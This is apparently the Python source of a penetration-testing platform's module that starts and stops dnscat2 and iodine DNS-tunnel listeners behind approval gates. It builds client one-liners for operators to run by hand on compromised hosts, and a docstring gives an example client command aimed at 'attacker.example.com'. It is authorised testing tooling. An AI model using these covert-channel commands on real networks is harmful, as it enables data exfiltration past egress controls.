"""DNS-tunnel obfuscation — HUMAN-ONLY listener lifecycle (dnscat2 / iodine).

A DNS tunnel is the standard test of whether a network's egress controls and DNS analytics
actually catch a covert channel: the client talks only to the host's configured resolver, so
it reaches the operator's authoritative server through the target's OWN DNS infrastructure
without ever opening a direct outbound connection at all. dnscat2 does encrypted C2 over DNS
(T1071.004);
iodine brings up a whole IP-over-DNS interface (T1572) and is far louder.

A tunnel has TWO halves and they carry completely different risk. THIS MODULE OWNS EXACTLY
ONE OF THEM:

THE LISTENER (server) half — :func:`start_listener` / :func:`stop_listener` /
    :func:`list_listeners`. *** HUMAN-ONLY *** AND *** GATED ***: engagement + approval +
    red-confirm, through the REAL ``executor.validate_request``, before anything is spawned.
    It runs on the OPERATOR's own sandbox for a zone the OPERATOR controls, a hardcoded
    container, a live cap, a tracked process, a refusal that runs nothing, every start and
    stop recorded.

    WHY THIS IS GATED NOW (build #7). It used to be ungated, and the justification it gave was
    "the identical reasoning the pivot-listener lifecycle uses". Build #5's I2 finding then
    TIGHTENED the pivot listener to require engagement + approval + red-confirm — so this
    module was left citing a precedent that no longer existed. The stale citation was the
    smaller problem. The larger one is that I2's actual argument applies here with full force:

        a pivot listener's whole purpose is to become a route into a network the scope gate
        has never seen, so it is gated like an execution, not treated as lifecycle

    A DNS-tunnel listener is the SERVER END OF A COVERT EXFIL CHANNEL. Its whole purpose is to
    carry arbitrary traffic out of a network through that network's own resolvers, which is
    the thing egress controls exist to stop. "No target" was true and beside the point, exactly
    as it was for the pivot listener. ``dnscat2-server`` and ``iodined`` are both already in
    ``allowlist._TUNNEL_TOOLS``, so the danger heuristic fires on the binary and the red-confirm
    is always required — a covert channel cannot be raised by a plain POST or by accident.

    Human-only remains true and is still the load-bearing property: THE AUTONOMOUS PATH HAS
    ZERO ROUTE HERE. A covert channel an agent could raise is an autonomous covert channel.
    Regression-locked by a source scan over the whole backend tree
    (test_obfuscation.py::test_obfuscation_surface_is_human_only), the same lock ``:kali``,
    the tunnels, live sessions and Sliver have. The gate is belt to that suspenders.

*** THE CLIENT half — :func:`operator_oneliner`. IT IS NEVER DELIVERED. ***
    The client runs on the FAR SIDE: a host the operator already has execution on. HackPit
    cannot reach a machine it has not compromised, and it must not try — so this function
    RETURNS A STRING and stops. The operator carries it across by hand (into ``:kali``, the
    live-session panel, a web shell), each of those being its own separately-approved step.
    Nothing in this module ships, drops, pipes or executes that string: there is no
    file-copy path into a container, no stdin pipe, no HTTP client, no SSH/SMB anywhere in
    the file, and the function is PURE — string construction only, no I/O, no clock, no subprocess. That is the
    same boundary ``tunnels.py`` draws around its agent one-liner, and it is the load-bearing
    property of this module.

THE ZONE AND THE TUNNEL NET ARE OPERATOR-OWNED, NEVER THE TARGET.
    ``zone`` is a DNS zone the operator controls and has had delegated to their own server;
    ``tunnel_net`` is the tunnel interface's own private address/netmask. Neither has anything
    to do with the system under test, and neither is ever substituted with the engagement
    target — pointing a tunnel at the client's own zone would be both useless and harmful.
    They are spelled ``<tunnel-zone>`` / ``<tunnel-net>`` in the tool catalog precisely so the
    composer's target-substitution pass cannot rewrite them (``<domain>`` and any ``<tun-ip>``
    spelling would be).

CONTAINMENT, the rest of it:
    * argv LISTS only, handed to subprocess as a list. Never a shell string, so no request
      value can ever reach a shell.
    * The container is a CODE CONSTANT (``config.ENGAGE_SANDBOX_CONTAINER``) — never a
      request field. :class:`ObfuscationRequest` has no container/sandbox field at all.
    * ``kind`` comes from a FIXED SET and ``zone`` / ``secret`` are pattern-bounded and may
      not start with ``-``, so nothing caller-supplied can be read as a flag.
    * Every start and stop is recorded via ``runstore.save_run``, with the operator's
      pre-shared tunnel password REDACTED — the audit trail must not become a key store.

THE PRE-SHARED KEY IS MASKED AT SOURCE, NOT AT THE EDGE.
    The key has to reach the server process, so :class:`ObfuscationListener` carries it. It is
    kept out of everything else STRUCTURALLY: both the exported ``client_command`` and the
    audited argv are BUILT from a :func:`_mask_secret` copy of the model, so the raw key is
    never embedded in a rendered string in the first place. It lives in exactly two places —
    the ``secret`` field, and the argv handed to ``subprocess`` — and nowhere else.

    This replaces an earlier ``str.replace(secret, "***")`` pass at the HTTP layer, which had
    two faults: it lived outside this module (so a new route that forgot to call it would
    re-export the key inside ``client_command``), and it was over-broad (a short key mangled
    unrelated characters, handing the operator a corrupt command). Masking by construction has
    neither fault: the mask is placed where the key would have gone and touches nothing else,
    and no caller can opt out of it.

THE LISTENER'S STATUS IS OBSERVED, NOT ASSIGNED (build #7). This module used to set
``status="listening"`` the instant ``Popen`` returned, which for dnscat2 was false:
``dnscat2-server`` is a Ruby CONSOLE, and ``docker exec`` without ``-i`` hands it a closed stdin,
so it logged "Input thread is over" and exited — while the panel said a channel was up. The start
now goes through ``cockpit/lifecycle.py``: a console binary gets a stdin that does not end, its
output is drained so it cannot wedge, and the status is only what was LOOKED AT — ``listening``
once ``ss`` inside the container confirms UDP/53 is bound, ``starting`` if the bind is
unconfirmed, and a process that died is a refusal rather than a fiction. HackPit holds that
console's stdin open and never types into it; see cockpit/lifecycle.py for why it is a raw fd
with no writer object attached.

The far-side client connect-back is inherently untestable without a real compromised host;
the listener lifecycle, the argv and the one-liner are built and unit-tested, and the actual
connect-back is the operator's manual step, exactly like the pivot tunnels' agent line.
"""

from __future__ import annotations

import ipaddress
import os as _os
import re
import subprocess
import threading
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, TypeVar

from pydantic import BaseModel, Field, field_validator, model_validator

from . import config, lifecycle, runstore
from .models import RunRecord

# The binaries, as spelled in the tool catalog (backend/arsenal/tools.json). Constants, never
# request fields — the same discipline the container names get.
#
# ASSUMPTION, to be confirmed by the image-build task: upstream dnscat2 ships a ``dnscat2``
# client and a Ruby ``dnscat2.rb`` server, while Kali packaging tends to supply hyphenated
# wrappers. We follow the catalog's spelling; if the image lands different names, change them
# HERE (one place) — nothing else in the codebase spells them.
DNSCAT2_SERVER_BIN = "dnscat2-server"
DNSCAT2_CLIENT_BIN = "dnscat2-client"
IODINE_SERVER_BIN = "iodined"
IODINE_CLIENT_BIN = "iodine"

KINDS = ("dnscat2", "iodine")

# The port a DNS tunnel server binds. Lives in cockpit/listener_ports.py so cockpit/exposure.py
# can learn it without importing this module — see that file. Re-exported so existing
# references stand.
from .listener_ports import DNS_TUNNEL_PORT  # noqa: E402

# The tunnel interface's own range. A private range by definition — it belongs to the tunnel,
# not to anybody's network, least of all the engagement's.
DEFAULT_TUNNEL_NET = "10.99.53.1/24"

# Bounds. Both servers bind UDP/53 inside the sandbox, so a second live listener usually needs
# the first stopped; the cap is here to bound accumulation, not to schedule ports.
MAX_LIVE_LISTENERS = int(_os.environ.get("HACKPIT_MAX_DNS_LISTENERS", "2"))

# A zone label: hostname characters (or an angle-bracket placeholder), never leading '-' so it
# cannot be read as a flag, and no whitespace/metacharacters to smuggle in.
_ZONE_RE = re.compile(r"^(?!-)[A-Za-z0-9._<>-]{1,253}$")
# A pre-shared password: anything printable except whitespace, again never leading '-'.
#
# MINIMUM 8. This is the key that authenticates every client to the operator's own tunnel
# server; a one- or two-character pre-shared key is not a legitimate value for it, and the
# bound is cheap to hold. (It is no longer load-bearing for redaction — see SECRET_MASK: the
# masked forms are BUILT, not string-substituted, so a short key can no longer mangle the
# rendered command. This bound exists on its own merits.)
_SECRET_MIN_LEN = 8
_SECRET_RE = re.compile(r"^(?!-)[!-~]{%d,128}$" % _SECRET_MIN_LEN)

# What the operator's key is replaced BY, everywhere a key must not appear. A module constant
# so the audit redaction, the exported one-liner and the tests all name the same thing.
SECRET_MASK = "***"


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# --------------------------------------------------------------------------- #
# models
# --------------------------------------------------------------------------- #
class ObfuscationRequest(BaseModel):
    """Start a DNS-tunnel listener. NO container field — the box is a constant.

    The server listens on the operator's own sandbox for a zone the operator owns, so nothing
    here can redirect WHERE it runs. ``engagement_id`` is no longer tagging-only: a covert
    channel is attributed and scoped like every other engagement action, and it is REQUIRED —
    see :func:`validate_start`.
    """

    kind: str = Field("dnscat2", description=f"Tunnel server — one of {KINDS}.")
    zone: str = Field(
        ...,
        min_length=1,
        description="The DNS zone YOU control and have had delegated to this server "
        "(<tunnel-zone>). NEVER the target's zone, and never substituted with the target.",
    )
    tunnel_net: str = Field(
        DEFAULT_TUNNEL_NET,
        description="iodine only: the tunnel interface's OWN private address/netmask "
        "(<tunnel-net>), e.g. 10.99.53.1/24. Unrelated to any engagement range.",
    )
    secret: str | None = Field(
        None,
        description="Pre-shared key/password for the tunnel. Required for iodine (-P); "
        "optional for dnscat2, which prints a generated one if omitted. REDACTED in the "
        "audit record.",
    )
    engagement_id: str | None = Field(
        None,
        description="The engagement this covert channel belongs to. REQUIRED — a DNS tunnel is "
        "a route out of a real network, so it is attributed and scoped like every other "
        "engagement action.",
    )
    # THE GATE FIELDS, the same shape the pivot listener got in I2. Both default False, so a
    # client that omits them is REFUSED rather than allowed — a default of True would mean an
    # omitted field silently grants exactly what the field was added to require.
    approved: bool = Field(
        False,
        description="Explicit human approval for starting this listener. Never defaulted true, "
        "never batched — a covert channel is an execution, not a lifecycle no-op.",
    )
    dangerous_ack: bool = Field(
        False,
        description="The explicit red-confirm. dnscat2-server and iodined are both in the "
        "covert-tunnel danger set, so the heuristic always flags them and this is always "
        "required.",
    )

    @field_validator("kind")
    @classmethod
    def _kind_ok(cls, v: str) -> str:
        v = str(v).strip().lower()
        if v not in KINDS:
            raise ValueError(f"kind must be one of {KINDS}")
        return v

    @field_validator("zone")
    @classmethod
    def _zone_ok(cls, v: str) -> str:
        v = str(v).strip()
        if not _ZONE_RE.match(v):
            raise ValueError(
                "zone must be a bare DNS name (or a <placeholder>) — no whitespace, no shell "
                "metacharacters, and it may not start with '-'"
            )
        return v

    @field_validator("tunnel_net")
    @classmethod
    def _tunnel_net_ok(cls, v: str) -> str:
        v = str(v).strip()
        try:
            iface = ipaddress.ip_interface(v)
        except ValueError:
            raise ValueError("tunnel_net must be an address/netmask, e.g. 10.99.53.1/24")
        if not iface.ip.is_private:
            raise ValueError(
                "tunnel_net is the tunnel interface's OWN range and must be private — a public "
                "range here would point the tunnel at somebody else's network"
            )
        return str(iface)

    @field_validator("secret")
    @classmethod
    def _secret_ok(cls, v: str | None) -> str | None:
        if v is None:
            return None
        v = str(v).strip()
        if not v:
            return None
        if not _SECRET_RE.match(v):
            raise ValueError(
                f"secret must be at least {_SECRET_MIN_LEN} printable characters with no "
                "whitespace, and may not start with '-'"
            )
        return v

    @model_validator(mode="after")
    def _iodine_needs_a_secret(self) -> "ObfuscationRequest":
        if self.kind == "iodine" and not self.secret:
            raise ValueError("iodine requires a pre-shared password (-P)")
        return self


class ObfuscationListener(BaseModel):
    """One DNS-tunnel listener this backend started. Operator infrastructure, not a target."""

    id: str
    kind: str
    status: str = Field(
        description="starting | listening | down — OBSERVED after the settle window, never "
        "assigned at spawn time. 'listening' means UDP/53 was confirmed bound inside the "
        "container; 'starting' means the process is up but the bind is unconfirmed."
    )
    container: str
    zone: str
    tunnel_net: str | None = None
    secret: str | None = Field(
        None,
        description="The operator's own pre-shared key, echoed back so the client one-liner "
        "can be rebuilt. Never written to the audit record.",
    )
    run_id: str
    client_command: str = Field(
        "",
        description="The CLIENT half, for the operator to run BY HAND on the far side, with "
        "the pre-shared key already MASKED (the operator chose that key and substitutes it "
        "themselves). HackPit never delivers or executes it — see operator_oneliner.",
    )
    setup_note: str = ""
    liveness: str = Field(
        "", description="What was actually observed about the server process and its port."
    )
    started_at: str
    stopped_at: str | None = None
    engagement_id: str | None = None


class ObfuscationRefused(RuntimeError):
    """Nothing started / nothing stopped. Carries the reason that refused it.

    ``dangerous_flags`` is populated when the danger gate refused, so the UI can render WHY
    rather than a generic banner — the same discipline the tunnel and WinRM confirms follow.
    """

    def __init__(self, reason: str, gate: str = "obfuscation",
                 dangerous_flags: list[str] | None = None):
        super().__init__(reason)
        self.reason = reason
        self.gate = gate
        self.dangerous_flags = dangerous_flags or []


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #
@dataclass
class _LiveListener:
    model: ObfuscationListener
    record: RunRecord
    watched: "lifecycle.Watched | None" = field(default=None)
    # The server argv, kept so a stop can reap the process INSIDE the container. Killing the
    # `docker exec` client does not stop what it started — see lifecycle.Watched.kill.
    server_argv: list[str] = field(default_factory=list)

    @property
    def proc(self):
        """The spawned server process, or None. Read-only view for liveness refresh."""
        return self.watched.proc if self.watched is not None else None


_listeners: dict[str, _LiveListener] = {}
_lock = threading.Lock()


def _container_running(name: str) -> bool:
    """Liveness probe for a container. Read-only — inspects, never execs into it."""
    try:
        p = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", name],
            capture_output=True, text=True, timeout=10.0,
        )
        return p.returncode == 0 and p.stdout.strip() == "true"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _save(record: RunRecord) -> None:
    """Persist a run record. Never raises — recording must not break the surface."""
    try:
        runstore.save_run(record)
    except Exception:  # pragma: no cover - persistence is best-effort
        pass


# Either model that can carry the operator's key. Constrained (not bound) so the copy comes
# back as the same type it went in as.
_WithSecret = TypeVar("_WithSecret", ObfuscationRequest, ObfuscationListener)


def _mask_secret(model: _WithSecret) -> _WithSecret:
    """A COPY of ``model`` whose ``secret`` is :data:`SECRET_MASK`. *** THE MASKING PRIMITIVE. ***

    Everything that must not carry the operator's key is BUILT from one of these copies rather
    than string-substituted afterwards, and that distinction is the whole point:

      * ``str.replace(secret, "***")`` is always over-broad. With a short or unlucky key it
        eats every other occurrence of those characters — a 1-character key turned
        ``dnscat2-client --secret=a attacker.example.com`` into
        ``dnsc***t2-client --secret=*** ***tt***cker.ex***mple.com``. Fail-safe, but the
        operator copies a corrupt command and the audit argv is mangled the same way.
      * Building from a masked copy puts the mask exactly where the key would have gone,
        structurally, and cannot touch anything else — whatever the key looks like.

    Pure: returns a new model, mutates nothing. A model with no secret is returned as-is.
    """
    if not model.secret:
        return model
    return model.model_copy(update={"secret": SECRET_MASK})


def _redacted(req: ObfuscationRequest) -> list[str]:
    """The SERVER argv REBUILT with the key masked. For the AUDIT RECORD only.

    The real argv is what runs; this is what gets persisted. A run record ends up in the
    engagement report and the runs DB, and neither should become a key store. Note this is the
    same pure builder the live argv comes from, run over a masked copy — not a substitution
    pass over the live argv (see :func:`_mask_secret`).
    """
    return _server_args(_mask_secret(req))


# --------------------------------------------------------------------------- #
# argv + the client one-liner — PURE (build strings, run nothing)
# --------------------------------------------------------------------------- #
def _server_args(req: ObfuscationRequest) -> list[str]:
    """The tunnel SERVER argv (binary first) for this request. *** PURE. ***

    A LIST of tokens and nothing else: no execution, no filesystem, no network, no clock — so
    the UI can preview exactly what a start would run before anyone clicks it.
    """
    if req.kind == "dnscat2":
        argv = [DNSCAT2_SERVER_BIN]
        if req.secret:
            argv.append(f"--secret={req.secret}")
        argv.append(req.zone)
        return argv
    # iodine: `iodined -f -c -P <password> <tunnel-net> <tunnel-zone>` (catalog template).
    return [
        IODINE_SERVER_BIN, "-f", "-c",
        "-P", str(req.secret),
        req.tunnel_net,
        req.zone,
    ]


def needs_console_stdin(kind: str) -> bool:
    """Does this tool's server need a stdin that never ends? PURE.

    ``dnscat2-server`` is a Ruby console and dies on EOF ("Input thread is over"); ``iodined -f``
    is a plain foreground daemon and needs no stdin at all. Least privilege per binary rather
    than one blanket default — see cockpit/lifecycle.py.
    """
    return kind == "dnscat2"


def operator_oneliner(listener: ObfuscationListener) -> str:
    """The CLIENT half, as a STRING for the operator to run BY HAND on the far side.

    *** THIS IS THE BOUNDARY. *** It builds a string and returns it. It does not deliver it,
    write it anywhere, pipe it into anything or execute it — the client runs on a machine
    HackPit has not compromised and must not reach. Carrying the line across is the operator's
    one manual step (``:kali``, the live-session panel, a web shell), and each of those is its
    own separately-approved action. The same posture ``tunnels.py`` takes with its agent line.

    PURE: string construction only — no I/O, no clock, no subprocess, no state. Deterministic
    for a given listener, so the UI may call it freely.

    IT RENDERS WHATEVER KEY THE LISTENER IT IS HANDED CARRIES — it is a formatter, not a
    policy. :func:`start_listener` therefore hands it a :func:`_mask_secret` copy, so the
    ``client_command`` stored on the listener (and thus every field that can cross an API
    boundary) is masked BY CONSTRUCTION rather than by a caller remembering to scrub it.
    """
    if listener.kind == "dnscat2":
        parts = [DNSCAT2_CLIENT_BIN]
        if listener.secret:
            parts.append(f"--secret={listener.secret}")
        parts.append(listener.zone)
        return " ".join(parts)
    # iodine: `iodine -f -P <password> <tunnel-zone>` (catalog template). `-r` forces DNS-only.
    return f"{IODINE_CLIENT_BIN} -f -P {listener.secret or '<password>'} {listener.zone}"


def _setup_note(req: ObfuscationRequest) -> str:
    """Operator-facing guidance. PURE."""
    if req.kind == "dnscat2":
        return (
            f"dnscat2 server is up inside {config.ENGAGE_SANDBOX_CONTAINER}, authoritative for "
            f"'{req.zone}' — a zone YOU control and have had delegated to this box. Run the "
            "client line BY HAND on the host you already have execution on; HackPit does not "
            "deliver it. Add `--dns server=<your-ip>` on the client only to test direct-to-"
            "server mode instead of recursion through the target's resolver."
        )
    return (
        f"iodined is up inside {config.ENGAGE_SANDBOX_CONTAINER} for '{req.zone}' with the "
        f"tunnel interface on {req.tunnel_net} (the tunnel's OWN private range, unrelated to "
        "any engagement range). Run the client line BY HAND on the compromised host; HackPit "
        "does not deliver it. Add `-r` on the client to skip the raw-UDP probe and force the "
        "DNS path you actually want tested."
    )


# --------------------------------------------------------------------------- #
# the gate — engagement + approval + the heuristic red-confirm, before anything spawns
# --------------------------------------------------------------------------- #
def _gate_request(req: ObfuscationRequest) -> "Any":
    """The ExecRequest the real gates run against.

    Surface: the SERVER BINARY, which is what drives the danger heuristic —
    ``dnscat2-server`` and ``iodined`` are both in ``allowlist._TUNNEL_TOOLS``, so a listener
    start always demands the red-confirm — plus the engagement.

    THE SERVER'S OWN ARGUMENTS ARE DELIBERATELY NOT IN THE SURFACE, the same call
    ``tunnels._gate_request`` documents at length. A tunnel server's arguments are the
    operator's OWN zone, the operator's OWN private tunnel range and the operator's OWN
    pre-shared key. None is a target; the scope extractor would read ``<tunnel-zone>`` or
    ``10.99.53.1/24`` as a host and refuse the operator's own infrastructure, which teaches
    nothing and trains a workaround. Two independent reasons make that safe rather than
    convenient: the danger verdict comes from the BINARY, not the arguments, so the red-confirm
    fires either way; and the pre-shared key must not be fed to a gate that records what it
    classified — see the redaction discipline above.
    """
    from .models import ExecRequest

    return ExecRequest(
        command=_server_args(req)[0],
        args=[],
        approved=req.approved,
        dangerous_ack=req.dangerous_ack,
        engagement_id=req.engagement_id,
    )


def validate_start(req: ObfuscationRequest):
    """The gate verdict for starting this listener, spawning nothing. PURE.

    A DNS-TUNNEL LISTENER REQUIRES AN ENGAGEMENT, for the reason ``tunnels.validate_start``
    gives: without one the request resolves to LAB mode, whose isolation gate proves the LAB
    sandbox is egress-less — a property of a container this listener does not run in. Firing a
    gate on an unrelated condition is its own kind of dishonesty. Engagement mode is the
    coherent home: no isolation floor (correct — the channel is real), and the covert channel
    is attributed to the engagement whose egress controls it exists to test.
    """
    from . import executor
    from .models import ExecRejected

    if not req.engagement_id:
        return ExecRejected(
            reason="a DNS-tunnel listener must name an engagement — it is the server end of a "
            "covert channel out of a real network, so it is attributed and scoped like every "
            "other engagement action",
            gate="engagement",
        )
    return executor.validate_request(_gate_request(req))


# --------------------------------------------------------------------------- #
# lifecycle — *** HUMAN-ONLY *** and *** GATED ***.
# --------------------------------------------------------------------------- #
def start_listener(req: ObfuscationRequest) -> ObfuscationListener:
    """Start a DNS-tunnel listener in the ENGAGE sandbox. *** HUMAN-ONLY *** and *** GATED. ***

    The real ``executor.validate_request`` runs FIRST (engagement + approval + red-confirm), so
    an unapproved or un-red-confirmed start is refused with NOTHING spawned. Also refuses —
    running NOTHING — if the sandbox is down, the live cap is hit, the docker CLI is missing, or
    the server process does not stay up.

    Returns the listener with its ``client_command`` filled in. That string is for the human;
    nothing here ships it anywhere. The autonomous path must have NO route to this function;
    see the module docstring.
    """
    rejected = validate_start(req)
    if rejected is not None:
        raise ObfuscationRefused(
            rejected.reason, gate=rejected.gate,
            dangerous_flags=list(getattr(rejected, "dangerous_flags", []) or []),
        )

    if not _container_running(config.ENGAGE_SANDBOX_CONTAINER):
        raise ObfuscationRefused(
            f"engage sandbox '{config.ENGAGE_SANDBOX_CONTAINER}' is not running — bring the "
            "stack up (docker compose -f docker/docker-compose.yml up -d)",
            gate="unavailable",
        )
    with _lock:
        live = sum(1 for l in _listeners.values() if l.model.status == "listening")
        if live >= MAX_LIVE_LISTENERS:
            raise ObfuscationRefused(
                f"too many live DNS-tunnel listeners ({live}/{MAX_LIVE_LISTENERS}) — stop one "
                "first (both servers bind UDP/53)",
                gate="limit",
            )

    lid = uuid.uuid4().hex[:12]
    run_id = uuid.uuid4().hex[:12]
    started_at = _now()
    server_args = _server_args(req)
    interactive = needs_console_stdin(req.kind)
    argv = lifecycle.exec_argv(
        config.ENGAGE_SANDBOX_CONTAINER, server_args, interactive=interactive
    )

    try:
        watched = lifecycle.spawn_watched(argv, interactive=interactive)
    except FileNotFoundError:
        raise ObfuscationRefused("docker CLI not found on PATH", gate="unavailable")

    # *** LOOK BEFORE REPORTING. *** Both servers bind UDP/53 inside the sandbox; the status
    # below is what was observed after the settle window, not what was assumed at spawn time. A
    # listener that died is a refusal — the operator must not be handed a client one-liner for a
    # channel that does not exist.
    live = lifecycle.observe(
        watched, container=config.ENGAGE_SANDBOX_CONTAINER, port=DNS_TUNNEL_PORT, proto="udp"
    )
    if not live.alive:
        watched.kill()
        raise ObfuscationRefused(
            f"the {req.kind} listener did not stay up — {live.detail}", gate="unavailable"
        )

    model = ObfuscationListener(
        id=lid,
        kind=req.kind,
        status=live.status,
        liveness=live.detail,
        container=config.ENGAGE_SANDBOX_CONTAINER,
        zone=req.zone,
        tunnel_net=req.tunnel_net if req.kind == "iodine" else None,
        secret=req.secret,
        run_id=run_id,
        setup_note=_setup_note(req),
        started_at=started_at,
        engagement_id=req.engagement_id,
    )
    # The one-liner has ONE source of truth, and it is the pure function — fed a MASKED copy.
    # *** THIS IS THE BOUNDARY, AND IT IS STRUCTURAL. *** The rendered client line is built
    # from a listener whose secret is already SECRET_MASK, so the real key is never embedded in
    # `client_command` at all. It therefore cannot leak through any route that returns this
    # model, present or future, whether or not that route remembers to scrub anything. The real
    # key goes to exactly one place: _server_args, i.e. the server process's own argv.
    model.client_command = operator_oneliner(_mask_secret(model))

    record = RunRecord(
        run_id=run_id,
        command=server_args[0],
        # REDACTED: the operator's tunnel password must not land in the audit trail. Rebuilt
        # from a masked copy, so a short key cannot mangle the rest of the argv.
        args=_redacted(req)[1:],
        # No target BY DEFINITION — this is the operator's own box. Recording the container
        # keeps the audit row honest instead of naming a system under test that was never
        # touched.
        target=config.ENGAGE_SANDBOX_CONTAINER,
        approved=True,  # it cleared the approval gate above
        mode="engagement",
        started_at=started_at,
        session_id=req.engagement_id,
    )
    with _lock:
        _listeners[lid] = _LiveListener(model=model, record=record, watched=watched,
                                        server_argv=list(server_args))
    _save(record)
    return model


def list_listeners() -> list[ObfuscationListener]:
    """Every listener this process knows about, re-observing liveness. Read-only.

    Both directions: a dead process becomes ``down``, and a ``starting`` listener whose UDP/53
    bind has since appeared becomes ``listening``. Demoting only would leave a listener that
    bound just after its settle window stuck on ``starting`` for its whole life.
    """
    with _lock:
        live = list(_listeners.values())
    for ll in live:
        if ll.model.status == "down":
            continue
        ll.model.status = lifecycle.refresh_status(
            ll.watched, ll.model.status,
            container=config.ENGAGE_SANDBOX_CONTAINER, port=DNS_TUNNEL_PORT, proto="udp",
        )
    return [ll.model for ll in live]


def get_listener(lid: str) -> ObfuscationListener | None:
    with _lock:
        ll = _listeners.get(lid)
    return ll.model if ll else None


def stop_listener(lid: str) -> ObfuscationListener:
    """Stop a listener (kill its process). *** HUMAN-ONLY. *** Idempotent.

    Closes the SAME run record the start opened (INSERT OR REPLACE), so the audit trail shows
    one listener with a start and an end rather than two unrelated rows.
    """
    with _lock:
        ll = _listeners.get(lid)
    if ll is None:
        raise ObfuscationRefused(f"no DNS-tunnel listener {lid}", gate="unknown")
    if ll.model.status == "down":
        return ll.model
    if ll.watched is not None:
        # EOF first (a console binary leaves politely), then kill the client, then reap the
        # server inside the container — killing `docker exec` does not stop what it started.
        ll.watched.kill(container=config.ENGAGE_SANDBOX_CONTAINER, server_argv=ll.server_argv)
    ll.model.status = "down"
    ll.model.stopped_at = _now()
    ll.record.finished_at = ll.model.stopped_at
    ll.record.exit_code = ll.proc.poll() if ll.proc is not None else None
    _save(ll.record)
    return ll.model


# --------------------------------------------------------------------------- #
# status + test helper
# --------------------------------------------------------------------------- #
def status() -> dict[str, Any]:
    """Availability + counts for the UI panel. Makes no isolation claim of its own."""
    up = _container_running(config.ENGAGE_SANDBOX_CONTAINER)
    return {
        "container": config.ENGAGE_SANDBOX_CONTAINER,
        "up": up,
        "live_listeners": sum(1 for l in list_listeners() if l.status == "listening"),
        "max_live_listeners": MAX_LIVE_LISTENERS,
        "detail": "" if up else "engage sandbox container is not running",
    }


def reset() -> None:  # test helper
    with _lock:
        for ll in _listeners.values():
            if ll.watched is not None:
                ll.watched.kill(container=config.ENGAGE_SANDBOX_CONTAINER,
                                server_argv=ll.server_argv)
        _listeners.clear()
